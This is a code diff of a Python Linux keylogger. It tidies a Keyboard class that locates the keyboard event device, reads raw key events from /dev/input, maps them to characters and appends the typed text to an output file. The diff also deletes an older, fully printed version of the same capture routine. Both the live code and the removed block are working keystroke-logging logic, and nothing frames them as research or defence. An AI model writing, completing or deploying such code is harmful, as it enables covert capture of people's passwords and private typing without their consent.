@@ -75,7 +75,7 @@ qwerty_map = {
 class Keyboard:
     def __init__(self, erase):
         if (erase == 'y'):
-            open(OUT_FILE, "w").close()
+            open(OUT_FILE, "w+").close()
         with open("/proc/bus/input/devices") as f:
             self.lines = f.readlines()
             self.pattern = re.compile("Handlers|EV=")
@@ -91,8 +91,8 @@ class Keyboard:
         self.typed = ""
 
     def data_stream(self):
-        print("Thread {} online",format(th.current_thread().name))
-        print("---PID {}",format(os.getpid()))
+        print(f"Thread {th.current_thread().name} online")
+        print(f"---PID {os.getpid()}")
         self.infile = open(self.infile_path, "rb")
         self.event = self.infile.read(EVENT_SIZE)
         while self.event:
@@ -108,42 +108,3 @@ class Keyboard:
                 with open(OUT_FILE, "a") as f:
                     f.write(self.typed)
                     self.typed = ""
-
-'''
-def read_keyboard():
-    with open("/proc/bus/input/devices") as f:
-        lines = f.readlines()
-        pattern = re.compile("Handlers|EV=")
-        handlers = list(filter(pattern.search, lines))
-        pattern = re.compile("EV=120013")
-        for idx, elt in enumerate(handlers):
-            if pattern.search(elt):
-                line = handlers[idx - 1]
-
-        pattern = re.compile("event[0-9]")
-        infile_path = "/dev/input/" + pattern.search(line).group(0)
-
-    FORMAT = 'llHHI'
-    EVENT_SIZE = struct.calcsize(FORMAT)
-
-    infile = open(infile_path, "rb")
-
-    event = in_file.read(EVENT_SIZE)
-    typed = ""
-
-    while event:
-        (_, _, type, code, value) = struct.unpack(FORMAT, event)
-
-        if code != 0 and type == 1 and value == 1:
-            if code in qwerty_map:
-                typed += qwerty_map[code]
-
-        event = infile.read(EVENT_SIZE)
-
-        if len(typed) >= 10:
-            with open("out.txt", "a") as f:
-                f.write(typed)
-                typed = ""
-
-    infile.close()
-'''
